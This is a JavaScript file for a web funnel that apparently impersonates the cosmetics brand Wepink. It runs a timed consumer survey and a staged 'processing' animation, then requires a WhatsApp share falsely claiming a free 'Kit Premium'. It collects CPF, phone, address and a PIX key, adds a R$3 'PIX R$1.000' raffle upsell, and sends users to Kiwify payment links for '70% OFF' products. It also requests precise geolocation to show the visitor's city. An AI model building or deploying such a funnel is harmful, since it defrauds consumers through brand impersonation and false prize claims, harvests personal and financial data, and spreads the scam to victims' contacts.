// ===== QUESTIONS =====
const questions = [
  { q: "Qual a sua faixa etária?", options: ["Menos de 18 anos", "18 a 25 anos", "26 a 35 anos", "Mais de 35 anos"] },
  { q: "Como você descreveria o seu tipo de pele?", options: ["Seca", "Mista", "Oleosa", "Normal"] },
  { q: "Qual é o seu principal objetivo com produtos bodycare?", options: ["Hidratação profunda", "Perfumação duradoura", "Firmeza e elasticidade", "Relaxamento"] },
  { q: "Com que frequência você utiliza hidratantes corporais?", options: ["Todos os dias", "Algumas vezes na semana", "Raramente", "Apenas no inverno"] },
  { q: "Você já conhecia a marca Wepink antes desta pesquisa?", options: ["Sim, já sou cliente", "Sim, mas nunca comprei", "Apenas de ouvir falar", "Não, é a primeira vez"] },
  { q: "O quão importante é a fragrância de um creme corporal para você?", options: ["Muito importante (define a compra)", "Importante", "Indiferente", "Prefiro sem fragrância"] },
  { q: "Qual destas famílias olfativas mais te atrai?", options: ["Adocicada (Baunilha)", "Floral", "Amadeirada", "Cítrica/Refrescante"] },
  { q: "Você costuma comprar produtos de beleza em kits ou individuais?", options: ["Sempre em kits", "Depende da promoção", "Geralmente individuais", "Apenas produtos que faltam"] },
  { q: "Qual o fator mais decisivo na hora de escolher um cosmético?", options: ["Qualidade / Fórmula", "Fragrância", "Preço / Promoção", "Recomendação de influenciadores"] },
  { q: "Onde você busca referências sobre beleza e cuidados?", options: ["Instagram / TikTok", "YouTube", "Indicação de amigas", "Não busco referências"] },
  { q: "Você gosta de utilizar espumas de banho ou óleos no banho?", options: ["Sim, sempre uso", "Uso em ocasiões especiais", "Gostaria de usar mais", "Não gosto"] },
  { q: "O que você acha do design das embalagens da Wepink?", options: ["Luxuoso e atrativo", "Moderno", "Normal", "Não prestei atenção"] },
  { q: "Onde você prefere comprar seus produtos de beleza?", options: ["Site oficial da marca", "Lojas físicas (shoppings)", "Farmácias", "Revendedoras"] },
  { q: "Qual a média do seu investimento mensal em beleza?", options: ["Até R$ 100", "De R$ 100 a R$ 250", "De R$ 250 a R$ 500", "Acima de R$ 500"] },
  { q: "Você prefere texturas corporais mais leves ou mais densas?", options: ["Leves e de rápida absorção", "Densas e ultra hidratantes", "Óleos", "Depende da estação do ano"] },
  { q: "A fixação prolongada da fragrância na pele é fundamental para você?", options: ["Sim, tem que durar o dia todo", "Gosto que dure algumas horas", "Prefiro algo suave", "Não me importo com isso"] },
  { q: "Com que frequência você presenteia pessoas com produtos de beleza?", options: ["Sempre", "Apenas em datas especiais", "Raramente", "Nunca"] },
  { q: "O que faria você se tornar uma cliente VIP da Wepink?", options: ["Brindes e kits exclusivos", "Descontos progressivos", "Frete grátis sempre", "Lançamentos antecipados"] },
  { q: "Em qual momento do dia você prefere sua rotina de autocuidado?", options: ["Pela manhã", "À noite, antes de dormir", "Após o treino", "Não tenho horário fixo"] },
  { q: "Como você avalia esta iniciativa da Wepink de ouvir você?", options: ["Excelente, me sinto valorizada", "Muito boa", "Interessante", "Indiferente"] }
];

// ===== STATE =====
let currentQ = 0;
const totalQ = questions.length;
const answers = [];

const PRODUCTS = [
  {
    id: 'prod1',
    name: 'VF Golden Desodorante Colônia 75ml',
    oldPrice: 299.90,
    newPrice: 89.97,
    image: './assets/vf_golden.webp',
    link: 'pac', // Usando link base pac para o preço, será substituído via API
    linkUpsell: 'pac_upsell'
  },
  {
    id: 'prod2',
    name: 'Body Splash VF Golden 200ml',
    oldPrice: 139.90,
    newPrice: 41.97,
    image: './assets/body_splash.webp',
    link: 'sedex',
    linkUpsell: 'sedex_upsell'
  },
  {
    id: 'prod3',
    name: 'Body Cream Obsessed 200ml',
    oldPrice: 139.90,
    newPrice: 41.97,
    image: './assets/body_cream.webp',
    link: 'sedex',
    linkUpsell: 'sedex_upsell'
  }
];

let selectedProduct = null;
let upsellActive = false;
const UPSELL_PRICE = 3.00;

// Kiwify payment links (injected via API)
let kiwifyLinks = null;
async function loadKiwifyLinks() {
  try {
    const res = await fetch('/api/kiwify-links');
    if (res.ok) kiwifyLinks = await res.json();
  } catch(e) { console.error('Failed to load kiwify links', e); }
}
loadKiwifyLinks();

// ===== DOM =====
const $ = (sel) => document.querySelector(sel);
// Screens
const screens = {
  landing: $('#landing-screen'),
  survey: $('#survey-screen'),
  processing: $('#processing-screen'),
  share: $('#share-screen'),
  selection: $('#selection-screen'),
  claim: $('#claim-screen'),
  confirmation: $('#confirmation-screen')
};

// ===== UTILS =====

function formatBRL(val) {
  return 'R$ ' + val.toFixed(2).replace('.', ',');
}

function generateProtocol() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = 'WPK-';
  for (let i = 0; i < 8; i++) result += chars[Math.floor(Math.random() * chars.length)];
  return result;
}

// ===== MASKS =====
function maskCPF(v) {
  return v.replace(/\D/g, '').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2').substring(0, 14);
}
function maskPhone(v) {
  v = v.replace(/\D/g, '');
  if (v.length <= 10) return v.replace(/(\d{2})(\d)/, '($1) $2').replace(/(\d{4})(\d)/, '$1-$2');
  return v.replace(/(\d{2})(\d)/, '($1) $2').replace(/(\d{5})(\d)/, '$1-$2').substring(0, 15);
}
function maskCEP(v) {
  return v.replace(/\D/g, '').replace(/(\d{5})(\d)/, '$1-$2').substring(0, 9);
}

function isValidCPF(cpf) {
  cpf = cpf.replace(/[^\d]+/g,'');
  if(cpf == '') return false;
  if (cpf.length != 11 || /^(\d)\1{10}$/.test(cpf)) return false;
  let add = 0;
  for (let i=0; i < 9; i ++) add += parseInt(cpf.charAt(i)) * (10 - i);
  let rev = 11 - (add % 11);
  if (rev == 10 || rev == 11) rev = 0;
  if (rev != parseInt(cpf.charAt(9))) return false;
  add = 0;
  for (let i = 0; i < 10; i ++) add += parseInt(cpf.charAt(i)) * (11 - i);
  rev = 11 - (add % 11);
  if (rev == 10 || rev == 11) rev = 0;
  if (rev != parseInt(cpf.charAt(10))) return false;
  return true;
}

// ===== STATE PERSISTENCE =====
function saveSurveyProgress() {
  localStorage.setItem('wepink_survey_state', JSON.stringify({ currentQ, answers }));
}

function loadSurveyProgress() {
  const saved = localStorage.getItem('wepink_survey_state');
  if (saved) {
    try {
      const data = JSON.parse(saved);
      if (data.answers && data.currentQ !== undefined) {
        if (data.currentQ < totalQ && data.currentQ > 0) {
          currentQ = data.currentQ;
          answers.length = 0;
          answers.push(...data.answers);
          return true;
        } else if (data.currentQ >= totalQ) {
          currentQ = data.currentQ;
          answers.length = 0;
          answers.push(...data.answers);
          return 'finished';
        }
      }
    } catch (e) {}
  }
  return false;
}

// ===== GEOLOCATION =====
function fetchGeolocation() {
  if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(async (position) => {
      try {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const res = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=pt`);
        if (res.ok) {
          const data = await res.json();
          const city = data.city || data.locality || data.principalSubdivision;
          if (city) {
            const cityEl = document.getElementById('geo-city');
            const msgEl = document.getElementById('geo-location-msg');
            if (cityEl && msgEl) {
              cityEl.textContent = city;
              msgEl.style.display = 'inline-block';
            }
          }
        }
      } catch (e) { console.error('Reverse geocode error', e); }
    }, (error) => {
      console.warn('Geolocation denied or error:', error.message);
    }, {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    });
  }
}

// ===== SCREEN MANAGEMENT =====
function switchScreen(name) {
  Object.values(screens).forEach(s => s.classList.remove('active'));
  screens[name].classList.add('active');
  // Scroll to top of container
  const container = document.querySelector('.app-container');
  if (container) container.scrollTop = 0;
}

// ===== SURVEY LOGIC =====
function renderQuestion() {
  const qData = questions[currentQ];
  const letters = ['A', 'B', 'C', 'D', 'E', 'F'];

  $('#question-text').textContent = qData.q;
  $('#current-q-num').textContent = currentQ + 1;
  $('#question-number').textContent = String(currentQ + 1).padStart(2, '0');

  const pct = Math.round((currentQ / totalQ) * 100);
  $('#progress-fill').style.width = pct + '%';
  $('#progress-percent').textContent = pct + '%';

  const container = $('#options-container');
  container.innerHTML = '';

  // Timer de aviso visual
  const timerDiv = document.createElement('div');
  timerDiv.id = 'question-timer';
  timerDiv.style.textAlign = 'center';
  timerDiv.style.color = 'var(--brand-pink)';
  timerDiv.style.fontWeight = '600';
  timerDiv.style.fontSize = '0.9rem';
  timerDiv.style.marginBottom = '16px';
  timerDiv.style.background = 'rgba(255, 20, 147, 0.1)';
  timerDiv.style.padding = '8px 12px';
  timerDiv.style.borderRadius = '8px';
  container.appendChild(timerDiv);

  let timeLeft = 3;
  timerDiv.innerHTML = `⏳ Leia com atenção. Liberando em ${timeLeft}s...`;

  const interval = setInterval(() => {
    timeLeft--;
    if (timeLeft > 0) {
      timerDiv.innerHTML = `⏳ Leia com atenção. Liberando em ${timeLeft}s...`;
    } else {
      clearInterval(interval);
      timerDiv.style.display = 'none';
    }
  }, 1000);

  qData.options.forEach((opt, i) => {
    const btn = document.createElement('button');
    btn.className = 'option-btn';
    btn.innerHTML = `<span class="option-letter">${letters[i]}</span><span>${opt}</span>`;
    btn.onclick = () => handleAnswer(btn, opt);

    // Trava inicial de 3 segundos
    btn.style.pointerEvents = 'none';
    btn.style.opacity = '0.5';
    btn.style.filter = 'grayscale(100%)';
    btn.style.transition = 'all 0.4s ease';

    setTimeout(() => {
      btn.style.pointerEvents = 'auto';
      btn.style.opacity = '1';
      btn.style.filter = 'grayscale(0%)';
    }, 3000);

    container.appendChild(btn);
  });
}

function handleAnswer(btn, answer) {
  // Disable clicks
  document.querySelectorAll('.option-btn').forEach(b => b.style.pointerEvents = 'none');
  btn.classList.add('selected');
  answers.push({ question: questions[currentQ].q, answer });
  currentQ++;
  saveSurveyProgress();

  setTimeout(() => {
    if (currentQ < totalQ) {
      renderQuestion();
    } else {
      finishSurvey();
    }
  }, 350);
}

function finishSurvey() {
  $('#progress-fill').style.width = '100%';
  $('#progress-percent').textContent = '100%';

  setTimeout(() => {
    switchScreen('processing');
    runProcessingAnimation();
  }, 300);
}

function runProcessingAnimation() {
  const steps = [
    { id: 'p-step-1', delay: 800 },
    { id: 'p-step-2', delay: 1800 },
    { id: 'p-step-3', delay: 2800 }
  ];

  steps.forEach(({ id, delay }) => {
    setTimeout(() => {
      const el = document.getElementById(id);
      el.classList.add('active');
      el.querySelector('.p-step-icon').textContent = '⏳';
    }, delay - 400);

    setTimeout(() => {
      const el = document.getElementById(id);
      el.classList.remove('active');
      el.classList.add('done');
      el.querySelector('.p-step-icon').textContent = '✅';
    }, delay);
  });

  setTimeout(() => {
    switchScreen('share');
    initShareScreen();
  }, 3500);
}

// ===== SHARE SCREEN =====
function initShareScreen() {
  const shareBtn = document.getElementById('wa-share-btn');
  const continueBtn = document.getElementById('wa-continue-btn');

  // Reseta os botões
  shareBtn.style.display = 'flex';
  continueBtn.style.display = 'none';

  shareBtn.onclick = function () {
    const text = "Meninas, acabei de responder a pesquisa da Wepink e ganhei um Kit Premium grátis! Corre que ainda dá tempo de pegar o seu: " + window.location.href;
    const whatsappUrl = "https://api.whatsapp.com/send?text=" + encodeURIComponent(text);
    window.open(whatsappUrl, '_blank');

    // Libera botão continuar após pequeno atraso
    setTimeout(() => {
      shareBtn.style.display = 'none';
      continueBtn.style.display = 'flex';
    }, 2000);
  };

  continueBtn.onclick = function () {
    switchScreen('selection');
    initSelectionScreen();
  };
}

// ===== SELECTION SCREEN =====
function initSelectionScreen() {
  const container = $('#product-options');
  const btn = $('#product-continue-btn');
  container.innerHTML = '';
  
  PRODUCTS.forEach(prod => {
    const el = document.createElement('div');
    el.className = 'product-card';
    el.innerHTML = `
      <div class="product-discount-badge">70% OFF</div>
      <img src="${prod.image}" alt="${prod.name}" class="product-card-img">
      <div class="product-card-info">
        <div class="product-card-title">${prod.name}</div>
        <div class="product-card-prices">
          <span class="product-price-old">${formatBRL(prod.oldPrice)}</span>
          <span class="product-price-new">${formatBRL(prod.newPrice)}</span>
        </div>
      </div>
    `;
    el.addEventListener('click', () => {
      document.querySelectorAll('.product-card').forEach(c => c.classList.remove('selected'));
      el.classList.add('selected');
      selectedProduct = prod;
      btn.disabled = false;
    });
    container.appendChild(el);
  });

  btn.onclick = () => {
    switchScreen('claim');
    initClaimForm();
  };
}

// ===== CLAIM FORM =====
function initClaimForm() {
  // Atualiza as views de pré-visualização do kit
  if (selectedProduct) {
    $('#claim-preview-img').src = selectedProduct.image;
    $('#claim-preview-name').textContent = selectedProduct.name;
    $('#claim-preview-old').textContent = formatBRL(selectedProduct.oldPrice);
    $('#claim-preview-new').textContent = formatBRL(selectedProduct.newPrice);
  }

  setupMasks();
  setupCEPSearch();
  setupUpsell();
  updateOrderSummary(); // Força a atualização do resumo assim que abre
}

function setupUpsell() {
  const checkbox = document.getElementById('upsell-checkbox');
  const pixField = document.getElementById('upsell-pix-field');
  const card = document.getElementById('upsell-card');

  if (!checkbox) return;

  checkbox.addEventListener('change', () => {
    upsellActive = checkbox.checked;
    pixField.style.display = upsellActive ? 'block' : 'none';
    card.classList.toggle('active', upsellActive);

    // Re-render the summary
    if (selectedProduct) {
      updateOrderSummary();
    }
  });
}

function setupMasks() {
  const cpfInput = $('#cpf');
  const phoneInput = $('#phone');
  const cepInput = $('#cep');

  cpfInput.addEventListener('input', () => { cpfInput.value = maskCPF(cpfInput.value); });
  phoneInput.addEventListener('input', () => { phoneInput.value = maskPhone(phoneInput.value); });
  cepInput.addEventListener('input', () => { cepInput.value = maskCEP(cepInput.value); });
}

function setupCEPSearch() {
  const cepInput = $('#cep');
  const cepBtn = $('#cep-search-btn');
  const cepStatus = $('#cep-status');

  const doSearch = () => {
    const raw = cepInput.value.replace(/\D/g, '');
    if (raw.length !== 8) {
      cepStatus.textContent = 'CEP deve ter 8 dígitos';
      cepStatus.className = 'field-status error';
      return;
    }
    fetchCEP(raw);
  };

  cepBtn.addEventListener('click', doSearch);

  // Auto-trigger as soon as the 8th digit is typed (mask formats it to 9 chars)
  cepInput.addEventListener('input', () => {
    const raw = cepInput.value.replace(/\D/g, '');
    if (raw.length === 8) fetchCEP(raw);
  });

  cepInput.addEventListener('blur', () => {
    const raw = cepInput.value.replace(/\D/g, '');
    if (raw.length === 8) fetchCEP(raw);
  });
}

let lastFetchedCEP = null;

function showShippingLoading() {
  const container = $('#shipping-options');
  container.innerHTML = `
    <div class="shipping-skeleton">
      <div class="skeleton-card">
        <div class="skel-info">
          <div class="skel-line skel-line-lg"></div>
          <div class="skel-line skel-line-sm"></div>
        </div>
      </div>
    </div>
  `;
}

async function fetchCEP(cep) {
  // Prevent duplicate calls for the same CEP
  if (cep === lastFetchedCEP) return;
  lastFetchedCEP = cep;

  const status = $('#cep-status');
  status.textContent = 'Buscando endereço...';
  status.className = 'field-status loading';

  // Immediately show skeleton loader in shipping section
  showShippingLoading();

  // Lock submit until CEP is resolved
  $('#submit-btn').disabled = true;

  try {
    const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
    const data = await res.json();

    if (data.erro) {
      status.textContent = 'CEP não encontrado';
      status.className = 'field-status error';
      return;
    }

    $('#street').value = data.logradouro || '';
    $('#neighborhood').value = data.bairro || '';
    $('#city').value = data.localidade || '';
    $('#state').value = data.uf || '';

    // Unlock fields that may need manual input
    if (!data.logradouro) {
      $('#street').removeAttribute('readonly');
      $('#street').focus();
    } else if (!data.bairro) {
      $('#neighborhood').removeAttribute('readonly');
      $('#neighborhood').focus();
    } else {
      $('#number').focus();
    }

    status.textContent = `✓ ${data.localidade} - ${data.uf}`;
    status.className = 'field-status success';

    renderShippingOptions();
  } catch (err) {
    status.textContent = 'Erro ao buscar CEP. Tente novamente.';
    status.className = 'field-status error';
  }
}

function renderShippingOptions() {
  const container = $('#shipping-options');
  container.innerHTML = `
    <div class="shipping-card selected" style="cursor:default;">
      <div class="shipping-info">
        <div class="shipping-name">📦 Transportadora Expresso</div>
        <div class="shipping-detail">Entrega em até 15 dias úteis</div>
      </div>
      <div class="shipping-price" style="color: var(--success); font-weight:700;">GRÁTIS</div>
    </div>
  `;

  $('#submit-btn').disabled = false;
}

function updateOrderSummary() {
  if (!selectedProduct) return;

  const price = selectedProduct.newPrice;
  const total = upsellActive ? price + UPSELL_PRICE : price;

  const summary = $('#order-summary');
  summary.style.display = 'block';

  summary.innerHTML = `
    <h4 class="form-section-title">
      <span class="section-icon">🧾</span> Resumo
    </h4>
    <div class="summary-row">
      <span id="summary-product-name" style="max-width: 65%; font-size: 0.9rem;">${selectedProduct.name}</span>
      <span class="summary-value" id="summary-product-value">${formatBRL(price)}</span>
    </div>
    <div class="summary-row" id="summary-shipping-row">
      <span id="summary-shipping-label">Frete Expresso</span>
      <span class="summary-value free-tag" id="summary-shipping-value">GRÁTIS</span>
    </div>
    ${upsellActive ? `
    <div class="summary-row">
      <span>🎰 Sorteio PIX R$ 1.000</span>
      <span class="summary-value upsell-tag">${formatBRL(UPSELL_PRICE)}</span>
    </div>
    ` : ''}
    <div class="summary-divider"></div>
    <div class="summary-row summary-total">
      <span>Total</span>
      <span class="summary-value" id="summary-total">${formatBRL(total)}</span>
    </div>
  `;
}

// ===== FORM VALIDATION & SUBMISSION =====
function validateForm() {
  const required = ['fullname', 'cpf', 'phone', 'email', 'cep', 'state', 'city', 'neighborhood', 'street', 'number'];
  let valid = true;

  required.forEach(id => {
    const input = document.getElementById(id);
    if (!input.value.trim()) {
      input.classList.add('error');
      valid = false;
    } else {
      input.classList.remove('error');
    }
  });

  // CPF validation (real valid algorithm)
  const cpfRaw = $('#cpf').value;
  if (!isValidCPF(cpfRaw)) {
    $('#cpf').classList.add('error');
    valid = false;
  }

  // Phone validation (10-11 digits)
  const phoneRaw = $('#phone').value.replace(/\D/g, '');
  if (phoneRaw.length < 10) {
    $('#phone').classList.add('error');
    valid = false;
  }

  // Email basic validation
  const email = $('#email').value;
  if (!email.includes('@') || !email.includes('.')) {
    $('#email').classList.add('error');
    valid = false;
  }

  // Check if CEP has been fetched and btn is enabled
  if ($('#submit-btn').disabled) valid = false;

  // PIX key validation if upsell is active
  if (upsellActive) {
    const pixKey = document.getElementById('pix-key');
    if (pixKey && !pixKey.value.trim()) {
      pixKey.classList.add('error');
      valid = false;
    } else if (pixKey) {
      pixKey.classList.remove('error');
    }
  }

  return valid;
}

// ===== EVENT LISTENERS =====

function checkOrderState() {
  const existingOrderStr = localStorage.getItem('wepink_order');
  let alreadyOrdered = false;
  let orderProtocol = null;
  let paymentStatus = null;
  let paymentUrl = null;

  if (existingOrderStr) {
    try {
      const existingOrder = JSON.parse(existingOrderStr);
      if (existingOrder.protocol) {
        alreadyOrdered = true;
        orderProtocol = existingOrder.protocol;
        paymentStatus = existingOrder.paymentStatus || 'pending';
        paymentUrl = existingOrder.paymentUrl;
      }
    } catch (e) { }
  }

  const startBtn = $('#start-btn');
  if (!startBtn) return; // Prevent errors if DOM not ready

  if (alreadyOrdered && paymentStatus === 'approved') {
    // Modify Landing Screen
    const infoBadges = document.querySelector('.info-badges');
    if (infoBadges) infoBadges.style.display = 'none';

    const trackLinkSmall = document.getElementById('track-link-small');
    if (trackLinkSmall) trackLinkSmall.style.display = 'none';

    document.querySelector('.promo-pill').textContent = "Pedido Recebido";
    document.querySelector('.title').innerHTML = "Acompanhe o seu<br><span class=\"text-gradient\">Produto Premium</span>";
    document.querySelector('.subtitle').textContent = "Você já garantiu seu produto. Clique no botão abaixo para acompanhar o envio do seu pedido.";

    startBtn.innerHTML = `
      <span>Acompanhar Pedido</span>
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
        <path d="M5 12h14" />
        <path d="m12 5 7 7-7 7" />
      </svg>
    `;

    // Removendo event listeners antigos caso existam substituindo o nó
    const newBtn = startBtn.cloneNode(true);
    startBtn.parentNode.replaceChild(newBtn, startBtn);

    newBtn.addEventListener('click', () => {
      window.location.href = `/track?p=${orderProtocol}`;
    });
  } else if (alreadyOrdered && paymentStatus === 'pending') {
    // Modify Landing Screen for Pending Payment
    const infoBadges = document.querySelector('.info-badges');
    if (infoBadges) infoBadges.style.display = 'none';

    const trackLinkSmall = document.getElementById('track-link-small');
    if (trackLinkSmall) trackLinkSmall.style.display = 'none';

    document.querySelector('.promo-pill').textContent = "Pagamento Pendente";
    document.querySelector('.title').innerHTML = "Finalize o seu<br><span class=\"text-gradient\">Pagamento</span>";
    document.querySelector('.subtitle').textContent = "Seu produto já está reservado, mas estamos aguardando o pagamento.";

    startBtn.innerHTML = `
      <span>Finalizar Pagamento</span>
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
        <path d="M5 12h14" />
        <path d="m12 5 7 7-7 7" />
      </svg>
    `;

    const newBtn = startBtn.cloneNode(true);
    startBtn.parentNode.replaceChild(newBtn, startBtn);

    newBtn.addEventListener('click', () => {
      if (paymentUrl) {
        window.location.href = paymentUrl;
      } else {
        window.location.href = `/track?p=${orderProtocol}`;
      }
    });
  } else {
    // Normal Flow
    const progress = loadSurveyProgress();
    // Removendo event listeners antigos para evitar duplicidade
    const newBtn = startBtn.cloneNode(true);
    startBtn.parentNode.replaceChild(newBtn, startBtn);
    
    if (progress === 'finished') {
      newBtn.innerHTML = `
        <span>Concluir Resgate do Produto</span>
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <path d="M5 12h14" />
          <path d="m12 5 7 7-7 7" />
        </svg>
      `;
      newBtn.addEventListener('click', () => {
        switchScreen('claim');
        initClaimForm();
      });
    } else if (progress === true) {
      newBtn.innerHTML = `
        <span>Continuar Pesquisa</span>
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <path d="M5 12h14" />
          <path d="m12 5 7 7-7 7" />
        </svg>
      `;
      newBtn.addEventListener('click', () => {
        switchScreen('survey');
        renderQuestion();
      });
    } else {
      newBtn.addEventListener('click', () => {
        switchScreen('survey');
        renderQuestion();
      });
    }
  }
}

document.addEventListener('DOMContentLoaded', () => {
  checkOrderState();
  fetchGeolocation();
});

window.addEventListener('pageshow', (e) => {
  if (e.persisted) {
    checkOrderState();
  }
});

document.addEventListener('DOMContentLoaded', () => {
  // Form submit
  $('#claim-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    if (!validateForm()) return;

    const btn = $('#submit-btn');
    btn.innerHTML = '<div class="spinner" style="width:22px;height:22px;border-width:2px;margin:0;"></div>';
    btn.disabled = true;

    const price = selectedProduct.newPrice;
    const totalPrice = upsellActive ? price + UPSELL_PRICE : price;

    // Build order object
    const order = {
      protocol: generateProtocol(),
      name: $('#fullname').value,
      cpf: $('#cpf').value,
      phone: $('#phone').value,
      email: $('#email').value,
      address: `${$('#street').value}, ${$('#number').value} - ${$('#neighborhood').value}, ${$('#city').value}/${$('#state').value} - CEP ${$('#cep').value}`,
      complement: $('#complement').value,
      shipping: 'Expresso',
      productName: selectedProduct.name,
      productPrice: price,
      shippingPrice: 0,
      upsellPix: upsellActive,
      upsellPixKey: upsellActive ? ($('#pix-key') ? $('#pix-key').value : '') : null,
      upsellPrice: upsellActive ? UPSELL_PRICE : 0,
      total: totalPrice,
      answers: answers,
      paymentStatus: 'pending',
      timestamp: new Date().toISOString()
    };

    // Save to localStorage BEFORE redirect (Kiwify will redirect back)
    localStorage.setItem('wepink_order', JSON.stringify(order));

    // Save to DB
    try {
      await fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(order)
      });
    } catch (err) {
      console.error('Erro ao salvar no banco:', err);
    }

    // Determine correct Kiwify link
    if (!kiwifyLinks) {
      try {
        const res = await fetch('/api/kiwify-links');
        if (res.ok) kiwifyLinks = await res.json();
      } catch (e) { console.error('Refetch failed', e); }
    }

    let paymentUrl = '';
    if (kiwifyLinks) {
      // Como a gente tem links diferentes baseados nos produtos (ou links padrão simulados)
      // Aproveitaremos os links de pac/sedex mapeados pelas chaves do produto
      const baseKey = selectedProduct.link;
      const upsellKey = selectedProduct.linkUpsell;
      paymentUrl = upsellActive ? kiwifyLinks[upsellKey] : kiwifyLinks[baseKey];
    }

    if (paymentUrl) {
      // Append customer email for pre-fill
      const sep = paymentUrl.includes('?') ? '&' : '?';
      const finalPaymentUrl = paymentUrl + sep + 'email=' + encodeURIComponent(order.email);
      
      order.paymentUrl = finalPaymentUrl;
      localStorage.setItem('wepink_order', JSON.stringify(order));
      
      window.location.href = finalPaymentUrl;
    } else {
      // Fallback: show confirmation and redirect to track
      alert('Erro ao carregar link de pagamento. Tente novamente.');
      btn.innerHTML = '<span>Finalizar Pedido</span>';
      btn.disabled = false;
    }
  });

  // Remove error class on input
  document.querySelectorAll('input').forEach(input => {
    input.addEventListener('input', () => input.classList.remove('error'));
  });
});
